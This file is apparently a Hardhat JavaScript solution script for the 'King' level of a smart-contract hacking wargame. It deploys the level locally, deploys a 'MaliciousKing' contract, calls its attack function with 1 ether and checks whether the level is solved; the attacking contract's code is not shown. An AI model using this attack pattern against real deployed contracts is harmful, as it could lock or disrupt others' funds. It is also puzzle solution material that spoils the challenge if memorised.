const { ethers } = require('hardhat');

async function main() {
    const [owner, player] = await ethers.getSigners();

    // deploy factory
    const Factory = await ethers.getContractFactory("KingFactory");
    const factory = await Factory.connect(owner).deploy();
    await factory.deployed();

    // deploy new instance
    const receipt = await factory.connect(player).createInstance(player.address, {
        value: ethers.utils.parseEther("0.001"),
    });
    const instance_address = (await receipt.wait()).events[0].args[0];
    const king = await ethers.getContractAt("King", instance_address, owner);

    const MalKing = await ethers.getContractFactory("MaliciousKing");
    const malKing = await MalKing.connect(player).deploy();
    await malKing.deployed();

    await malKing.attack(king.address, {
        value: ethers.utils.parseEther("1"),
    });

    // check
    let res = await factory.validateInstance(king.address, player.address);
    res = (await res.wait()).events[0].args[0];

    if (res == true) {
        console.log("[+] Done!");
    } else {
        console.log("[+] Fail...");
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});



